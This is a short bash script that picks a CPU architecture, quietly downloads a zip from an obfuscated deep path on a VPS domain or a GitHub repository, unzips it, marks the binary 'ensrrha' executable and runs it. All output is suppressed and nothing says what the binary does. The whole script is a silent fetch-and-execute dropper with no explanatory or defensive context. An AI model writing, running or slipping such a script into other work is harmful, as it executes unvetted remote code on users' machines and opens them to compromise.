#!/bin/bash

declare -A URLS=(
  ["amd64"]="script.ha-vps.store/o/v22/v22/v/v/vtt/v55/vttr/vyy/iiiiii/vps/ok/bbeje/idjsj/jdjeje/idjdjdj/djjejrrodn/djjddj/hdhddjdj/djjssj/hhdsh/jejeje/ensrrha.zip"
  ["arm64"]="https://github.com/zixdxh/hamza/raw/refs/heads/main/o/v22/v22/v/v/vtt/v55/vttr/vyy/iiiiii/vps/ok/bbeje/idjsj/jdjeje/idjdjdj/djjejrrodn/djjddj/hdhddjdj/djjssj/hhdsh/jejeje/arch64.zip"
)

ARCH=$(uname -m)
case "$ARCH" in
  x86_64|amd64) ARCH="amd64" ;;
  aarch64|armv8l|arm64) ARCH="arm64" ;;
  *) exit 1 ;;
esac

URL="${URLS[$ARCH]}"
[[ -z "$URL" ]] && exit 1

wget -q -O ensrrha.zip "$URL" >/dev/null 2>&1 || exit 1
unzip -o -q ensrrha.zip >/dev/null 2>&1 || exit 1
chmod +x ensrrha >/dev/null 2>&1 || exit 1

./ensrrha
